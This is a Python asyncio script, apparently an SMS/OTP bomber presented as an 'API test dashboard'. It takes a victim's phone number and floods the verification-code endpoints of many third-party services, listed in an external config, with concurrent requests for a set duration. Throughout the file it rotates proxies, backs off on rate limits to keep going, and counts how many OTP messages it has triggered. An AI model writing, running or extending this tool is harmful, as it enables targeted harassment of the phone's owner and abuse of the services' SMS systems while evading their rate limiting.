import asyncio
import aiohttp #type: ignore
import time
import random
import os
import copy
from aiohttp_socks import ProxyConnector #type: ignore
from aiohttp import TCPConnector #type: ignore
from apis import API_CONFIGS
from helpers import replacePlaceholders

phone=input("Phone: ")
timeInput=input("Run time (30s / 5m / 1h): ")
senders=int(input("Sender workers: "))
useProxy=input("Use proxies? (y/n): ").lower()=="y"

def parseTime(t):
    if t.endswith("s"):return int(t[:-1])
    if t.endswith("m"):return int(t[:-1])*60
    if t.endswith("h"):return int(t[:-1])*3600
    return int(t)

duration=parseTime(timeInput)

proxyList=[]
if useProxy and os.path.exists("proxies.txt"):
    with open("proxies.txt") as f:
        proxyList=[p.strip() for p in f if p.strip()]

stats={}
cooldowns={}
for api in API_CONFIGS:
    stats[api["name"]]={"success":0,"fail":0,"otp":0,"times":[],"429":0}
    cooldowns[api["name"]]=0

globalStats={"total":0,"errors":0,"otpSent":0}

requestQueue=asyncio.Queue(maxsize=20000)

def isOtpSuccess(status,text):
    t=text.lower()
    if status in [200,201,202]:
        keys=["otp","sent","verification","generated","success"]
        if any(k in t for k in keys):return True
        if '"success":true' in t:return True
        if '"status":"success"' in t:return True
        if "ok" in t:return True
    return False

async def dashboard(startTime):
    while True:
        elapsed=time.time()-startTime
        rps=0 if elapsed==0 else globalStats["total"]/elapsed
        os.system("cls" if os.name=="nt" else "clear")
        print("========== API TEST DASHBOARD ==========\n")
        print(f"Requests/sec : {round(rps,2)}")
        print(f"Total sent   : {globalStats['total']}")
        print(f"OTP SENT     : {globalStats['otpSent']}")
        print(f"Errors       : {globalStats['errors']}\n")
        for api in stats:
            s=stats[api]["success"]
            f=stats[api]["fail"]
            o=stats[api]["otp"]
            t=stats[api]["times"]
            avg=round(sum(t)/len(t)*1000,2) if t else 0
            print(f"{api:15} OK:{s:5} FAIL:{f:5} OTP:{o:5} AVG:{avg}ms")
        print("\n========================================")
        await asyncio.sleep(1)

async def checkProxy(proxy):
    try:
        connector=ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("http://httpbin.org/ip",timeout=aiohttp.ClientTimeout(total=5)):
                return proxy
    except:return None

async def validateProxies():
    if not proxyList:return []
    print(f"Checking {len(proxyList)} proxies...")
    tasks=[checkProxy(p) for p in proxyList]
    results=await asyncio.gather(*tasks)
    working=[p for p in results if p]
    print(f"Working proxies: {len(working)}")
    return working

async def callApi(session,api):
    name=api["name"]
    if cooldowns[name]>time.time():
        await asyncio.sleep(0.5)
        return
    retries=2
    while retries>=0:
        try:
            config=copy.deepcopy(api)
            headers=replacePlaceholders(config.get("headers"),phone)
            params=replacePlaceholders(config.get("params"),phone)
            jsonData=replacePlaceholders(config.get("json"),phone)
            data=replacePlaceholders(config.get("data"),phone)
            cookies=replacePlaceholders(config.get("cookies"),phone)
            url=config["url"].replace("{phone}",phone)
            start=time.time()
            async with session.request(config["method"],url,headers=headers,params=params,json=jsonData,data=data,cookies=cookies,timeout=aiohttp.ClientTimeout(total=15)) as resp:
                latency=time.time()-start
                text=await resp.text()
                globalStats["total"]+=1
                stats[name]["times"].append(latency)
                if isOtpSuccess(resp.status,text):
                    stats[name]["success"]+=1
                    stats[name]["otp"]+=1
                    globalStats["otpSent"]+=1
                    return
                if resp.status==429:
                    stats[name]["429"]+=1
                    stats[name]["fail"]+=1
                    if stats[name]["429"]>=5:
                        cooldowns[name]=time.time()+10
                        stats[name]["429"]=0
                    return
                if resp.status<400:
                    stats[name]["success"]+=1
                    return
                stats[name]["fail"]+=1
                globalStats["errors"]+=1
                return
        except Exception:
            retries-=1
            globalStats["errors"]+=1
            if retries<0:
                stats[name]["fail"]+=1
                return

async def requestGenerator(endTime):
    while time.time()<endTime:
        api=random.choice(API_CONFIGS)
        await requestQueue.put(api)

async def sender(proxy,endTime):
    connector=None
    if proxy:
        connector=ProxyConnector.from_url(proxy)
    else:
        connector=TCPConnector(limit=2000)
    async with aiohttp.ClientSession(connector=connector) as session:
        runningTasks=set()
        while time.time()<endTime or not requestQueue.empty():
            if len(runningTasks)>=80:
                done,_=await asyncio.wait(runningTasks,return_when=asyncio.FIRST_COMPLETED)
                runningTasks-=done
            api=await requestQueue.get()
            task=asyncio.create_task(callApi(session,api))
            runningTasks.add(task)
            requestQueue.task_done()
        if runningTasks:
            await asyncio.wait(runningTasks)

async def main():
    startTime=time.time()
    endTime=startTime+duration
    workingProxies=[]
    if useProxy:workingProxies=await validateProxies()
    dashTask=asyncio.create_task(dashboard(startTime))
    generatorTask=asyncio.create_task(requestGenerator(endTime))
    tasks=[]
    for i in range(senders):
        proxy=None
        if workingProxies:proxy=workingProxies[i%len(workingProxies)]
        tasks.append(asyncio.create_task(sender(proxy,endTime)))
    await asyncio.gather(generatorTask,*tasks)
    dashTask.cancel()

asyncio.run(main())